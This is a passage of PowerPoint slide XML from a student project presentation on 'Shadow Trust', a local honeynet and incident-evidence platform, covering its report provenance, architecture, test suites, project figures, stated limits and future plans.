          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="8A6320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" y="609904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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Declared plainly in the product: this is an internal readiness self-assessment, not a SOC 2 examination — a real attestation requires an independent licensed CPA firm.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19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/>
      <p:bldP spid="35" grpId="0" animBg="1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3" grpId="0"/>
      <p:bldP spid="44" grpId="0" animBg="1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 animBg="1"/>
      <p:bldP spid="67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18 ·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Eight reports, each one provable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10512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8366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93976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dashboard stats, detections, incidents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10512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883664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Geographic threat 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93976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events joined to IP geolocation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87168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256032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Incident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770632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detections, timeline, evidence, analyst activity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487168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56032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DFIR / forensic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70632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sessions, command history, behaviour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163824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369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Captured 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44728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parsed login payloads + issuance audit trail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3163824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323697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Detection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447288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scenario runs graded against real detections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40479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59" y="3913631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Malware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123943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static + YARA + ClamAV + secret findings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74720" y="3840479"/>
            <a:ext cx="2688336" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11290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3913631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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SOC 2 readiness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123943"/>
            <a:ext cx="23957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6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>49 controls scored from live evidence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55664" y="1810512"/>
            <a:ext cx="5093208" cy="3364992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2717"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="45000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="D4634A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48272" y="199339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PROVENANCE BLOCK — ON EVERY COVER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230428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generated_by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8784" y="231343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authenticated operator who ran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2724912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generated_at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8784" y="2734056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UTC, alongside the operator's local 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3145536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data_window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3154679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exact interval the report covers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3566160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source_systems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58784" y="3575304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which subsystems were queried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3986784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row_counts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4" y="3995928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how many records each query returned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48272" y="440740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8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>document_sha256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58784" y="4416552"/>
            <a:ext cx="28346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hash of the rendered PDF itself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48272" y="4864608"/>
            <a:ext cx="4517136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48272" y="4956048"/>
            <a:ext cx="45354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Rendered with WeasyPrint + Jinja2 · stored server-side · authenticated download only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358384"/>
            <a:ext cx="10911535" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10204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" y="5541264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A reader can take any figure in a Shadow Trust report, look at the provenance block, and see which system answered it, over what window, and how many rows were behind it. That is the difference between a report and a screenshot.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20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49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  <p:bldP spid="30" grpId="0"/>
      <p:bldP spid="31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 animBg="1"/>
      <p:bldP spid="48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19 · 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Five languages, one relational core, twelve containers.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21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47088"/>
            <a:ext cx="5760720" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1428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75104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60A5FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri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12848"/>
            <a:ext cx="53218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40 static pages · vanilla JS · Chart.js · Server-Sent Events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33472"/>
            <a:ext cx="5760720" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1428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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>nginx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999232"/>
            <a:ext cx="53218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serves the dashboard and the public site — never the evidence directories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19856"/>
            <a:ext cx="5760720" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="232329">
              <a:alpha val="88000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="D4634A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547872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E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>FastAPI backend  ·  Python 3.11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785615"/>
            <a:ext cx="53218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152 routes across 31 endpoint modules · async SQLAlchemy · JWT + RBAC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5760720" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1428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517136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D4634A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Engines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754880"/>
            <a:ext cx="53218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detection · correlation · session · timeline · evidence · compliance · reporting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175504"/>
            <a:ext cx="5760720" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14285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303520"/>
            <a:ext cx="5303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60A5FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>MariaDB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5541264"/>
            <a:ext cx="5321808" cy="2926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31 models · aiomysql async driver · phpMyAdmin for inspection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847088"/>
            <a:ext cx="4873752" cy="3877056"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2358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202996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LANGUAGE CHOICES, AND WHY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35915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A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Python 3.11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569464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async FastAPI, plus the ecosystem the analysis engines need — yara-python, pefile, networkx, WeasyPrint.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017520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A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>SQL · SQLAlchemy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227832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31 relational models with real constraints; the content hash as a primary key is a schema decision, not application logic.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3675887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A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>YAML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3886200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detection rules and attack scenarios live as data, so they are reviewable in a diff and reloadable without a deploy.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334256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A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>JavaScript · HTML · CSS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4544568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no build step, no framework — the dashboard is served as static files and reads one SSE stream.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992624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8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>Docker Compose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202936"/>
            <a:ext cx="4315968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950" b="0">
                <a:solidFill>
                  <a:srgbClr val="A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>579 lines describing 14 service definitions across four networks — including the two that never bridge.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7044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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>Local-first by default: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>docker compose up</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t> brings up the whole platform with no cloud account. AWS mode is optional.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21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38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/>
      <p:bldP spid="11" grpId="0" animBg="1"/>
      <p:bldP spid="12" grpId="0"/>
      <p:bldP spid="13" grpId="0"/>
      <p:bldP spid="14" grpId="0" animBg="1"/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20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What is actually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133 tests across 16 suites — run with make test against a live database container.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22 / 24</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Oval 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="692658" y="1945386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test_collector_persistence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1024" y="18196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cursors survive a mid-cycle crash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762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233921" y="1945386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8105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test_local_telemetry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62288" y="18196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three sensor formats normalise to one schema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1762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2658" y="2402586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2677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test_detection_rules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1024" y="22768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rule parsing, thresholds, grouping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334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33921" y="2402586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22677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test_detection_engine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2768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correlation, incident creation, idempotency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26334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2658" y="2859786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27249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test_detection_validation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1024" y="27340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scenario grading and target lock-down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30906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233921" y="2859786"/>
            <a:ext cx="77724" cy="7772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27249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test_timeline_and_evidence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27340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ordering and chain-of-custody integrity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30906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2658" y="3316986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31821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test_malware_isolation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21024" y="31912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samples are unreachable by any static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5478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233921" y="3316986"/>
            <a:ext cx="77724" cy="77724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31821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test_container_manager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31912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sandbox policy is enforced before start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81344" y="35478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2658" y="3774185"/>
            <a:ext cx="77724" cy="77724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36393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test_analysis_shell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21024" y="36484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sandbox events reach the real pipeline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40050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33921" y="3774185"/>
            <a:ext cx="77724" cy="77724"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8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36393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test_lab_lifecycle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62288" y="36484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provisioning, TTL and reclamation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81344" y="40050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2658" y="4231386"/>
            <a:ext cx="77724" cy="77724"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="A1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0965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test_docker_provider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21024" y="41056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local provider behaviour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" y="44622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233921" y="4231386"/>
            <a:ext cx="77724" cy="77724"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="A1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55664" y="40965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test_provider_factory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62288" y="41056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local / AWS provider selection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81344" y="44622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2658" y="4688586"/>
            <a:ext cx="77724" cy="77724"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="A1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45537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test_guacamole_integration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21024" y="45628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lab desktop streaming path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0080" y="49194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33921" y="4688586"/>
            <a:ext cx="77724" cy="77724"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="A19E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55664" y="45537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test_yara_scanner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62288" y="45628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signature matching correctness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1344" y="49194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92658" y="5145786"/>
            <a:ext cx="77724" cy="7772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14400" y="50109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test_health_hardening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21024" y="50200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the health page cannot leak when disabled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53766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233921" y="5145786"/>
            <a:ext cx="77724" cy="77724"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6E6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55664" y="5010912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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>conftest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62288" y="502005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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>fixtures, isolated database, deterministic clock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81344" y="5376672"/>
            <a:ext cx="521208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640080" y="5504688"/>
            <a:ext cx="5376672" cy="841248"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10869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14400" y="565099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WHAT THE SUITE DELIBERATELY PROVES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14400" y="587044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The security properties — isolation, custody, policy enforcement — are asserted in code, not just documented in a README.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99632" y="5504688"/>
            <a:ext cx="5349240" cy="841248"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10869"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="92000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="3A3A42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473952" y="5650992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6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>KNOWN LIMITS, STATED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73952" y="5870448"/>
            <a:ext cx="480974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No load testing at production scale; no third-party penetration test; the SOC 2 assessment is self-reported readiness only.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22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4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4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4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1265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/>
      <p:bldP spid="19" grpId="0" animBg="1"/>
      <p:bldP spid="20" grpId="0" animBg="1"/>
      <p:bldP spid="21" grpId="0"/>
      <p:bldP spid="22" grpId="0"/>
      <p:bldP spid="23" grpId="0" animBg="1"/>
      <p:bldP spid="24" grpId="0" animBg="1"/>
      <p:bldP spid="25" grpId="0"/>
      <p:bldP spid="26" grpId="0"/>
      <p:bldP spid="27" grpId="0" animBg="1"/>
      <p:bldP spid="28" grpId="0" animBg="1"/>
      <p:bldP spid="29" grpId="0"/>
      <p:bldP spid="30" grpId="0"/>
      <p:bldP spid="31" grpId="0" animBg="1"/>
      <p:bldP spid="32" grpId="0" animBg="1"/>
      <p:bldP spid="33" grpId="0"/>
      <p:bldP spid="34" grpId="0"/>
      <p:bldP spid="35" grpId="0" animBg="1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 animBg="1"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47" grpId="0" animBg="1"/>
      <p:bldP spid="48" grpId="0" animBg="1"/>
      <p:bldP spid="49" grpId="0"/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0" animBg="1"/>
      <p:bldP spid="52" grpId="0" animBg="1"/>
      <p:bldP spid="53" grpId="0"/>
      <p:bldP spid="54" grpId="0"/>
      <p:bldP spid="55" grpId="0" animBg="1"/>
      <p:bldP spid="56" grpId="0" animBg="1"/>
      <p:bldP spid="57" grpId="0"/>
      <p:bldP spid="58" grpId="0"/>
      <p:bldP spid="59" grpId="0" animBg="1"/>
      <p:bldP spid="60" grpId="0" animBg="1"/>
      <p:bldP spid="61" grpId="0"/>
      <p:bldP spid="62" grpId="0"/>
      <p:bldP spid="63" grpId="0" animBg="1"/>
      <p:bldP spid="64" grpId="0" animBg="1"/>
      <p:bldP spid="65" grpId="0"/>
      <p:bldP spid="66" grpId="0"/>
      <p:bldP spid="67" grpId="0" animBg="1"/>
      <p:bldP spid="68" grpId="0" animBg="1"/>
      <p:bldP spid="69" grpId="0"/>
      <p:bldP spid="70" grpId="0"/>
      <p:bldP spid="71" grpId="0" animBg="1"/>
      <p:bldP spid="72" grpId="0" animBg="1"/>
      <p:bldP spid="73" grpId="0"/>
      <p:bldP spid="74" grpId="0"/>
      <p:bldP spid="75" grpId="0" animBg="1"/>
      <p:bldP spid="76" grpId="0"/>
      <p:bldP spid="77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21 ·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By the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35024"/>
            <a:ext cx="109115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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>Measured against the repository — these exist to show the scope, not to impress.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23 / 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83664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2103120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~51K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lines of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12724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backend · frontend · tests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1883664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1" y="2103120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152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1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API routes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1" y="312724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31 endpoint modules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883664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103120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data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2724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one relational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4544" y="1883664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62288" y="2103120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28346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containers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3127248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up by default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913632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133088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4864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live sensors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157216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SSH · SMB · HTTP surfaces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3913632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39311" y="4133088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9311" y="4864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ATT&amp;CK techniques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9311" y="5157216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referenced in code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3913632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133088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49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864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SOC 2 criteria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57216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25 live collectors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24544" y="3913632"/>
            <a:ext cx="2615184" cy="1792224"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5102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62288" y="4133088"/>
            <a:ext cx="219456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8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>133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62288" y="486460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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>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62288" y="5157216"/>
            <a:ext cx="22128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16 suites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53328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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>Eight report types, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>six detection rules</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>, eight attack scenarios — and every figure above traces to a file in the repository.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23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 animBg="1"/>
      <p:bldP spid="29" grpId="0"/>
      <p:bldP spid="30" grpId="0"/>
      <p:bldP spid="31" grpId="0"/>
      <p:bldP spid="32" grpId="0" animBg="1"/>
      <p:bldP spid="33" grpId="0"/>
      <p:bldP spid="34" grpId="0"/>
      <p:bldP spid="35" grpId="0"/>
      <p:bldP spid="36" grpId="0" animBg="1"/>
      <p:bldP spid="37" grpId="0"/>
      <p:bldP spid="38" grpId="0"/>
      <p:bldP spid="39" grpId="0"/>
      <p:bldP spid="40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spc="300">
                <a:solidFill>
                  <a:srgbClr val="D4634A"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>22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1153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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>What was built, and where it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73936"/>
            <a:ext cx="5376672" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3571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12848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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Shadow Trust carries a single event from a live honeypot to a graded incident, an ATT&amp;CK mapping, a chain-of-custody record and a scored compliance control — on one machine, with the reasoning preserved at every hop and no paid service in the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28416"/>
            <a:ext cx="4846320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7834" y="3545585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1" y="3474720"/>
            <a:ext cx="4590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alibri"/>
              </a:rPr>
              <a:t>Detection is explainable — every finding states why it fired.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Oval 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="957834" y="3801618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1" y="3730752"/>
            <a:ext cx="4590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alibri"/>
              </a:rPr>
              <a:t>Evidence is verifiable — every artefact carries its own hash.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Oval 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="957834" y="4057650"/>
            <a:ext cx="59436" cy="5943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1" y="3986783"/>
            <a:ext cx="45902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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Claims are testable — the platform grades its own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773936"/>
            <a:ext cx="5349240" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3571"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C1C21">
              <a:alpha val="92000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2E2E36"/>
            </a:solidFill>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="88900" dist="38100" dir="5400000" algn="bl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1956816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120">
                <a:solidFill>
                  <a:srgbClr val="D4634A"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>FUTURE 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23113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20">
                <a:solidFill>
                  <a:srgbClr val="D4634A"/>
                </a:solidFill>
                <a:latin typeface="Courier New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70064" y="2212848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E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sigma rule import at scale · alert delivery to Slack and email · detection-rule authoring in the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2852928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20">
                <a:solidFill>
                  <a:srgbClr val="D4634A"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>SOON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2834640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E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Multi-node honeynet federation · richer IOC enrichment feeds · retention and archival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47472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120">
                <a:solidFill>
                  <a:srgbClr val="D4634A"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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3456432"/>
            <a:ext cx="39136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>
                <a:solidFill>
                  <a:srgbClr val="A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Automated containment actions · analyst workflow metrics · a published, citable telemetry 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1060704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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>The honeynet is not the deliverable. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2600" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>The evidence trail is.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596128"/>
            <a:ext cx="10911535" cy="7315"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2E2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779008"/>
            <a:ext cx="6400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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Ayush Kumar Singh · Hetvi Patel · Nandini Upadhye · Malav Shah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998464"/>
            <a:ext cx="6858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E6B76"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Guide: Dr. E. Kanniappan · Parul Institute of Engineering &amp; Technology · 2026–27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779008"/>
            <a:ext cx="46908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E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>github.com/ayushsingh-byte/ShadowTrust-Security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998464"/>
            <a:ext cx="46908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50" b="0">
                <a:solidFill>
                  <a:srgbClr val="6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Thank you — questions welcome.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E6B76"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Shadow Trust · PIET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4335" y="6473952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E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>24 / 24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15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345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75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/>
      <p:bldP spid="28" grpId="0"/>
      <p:bldP spid="29" grpId="0"/>
      <p:bldP spid="3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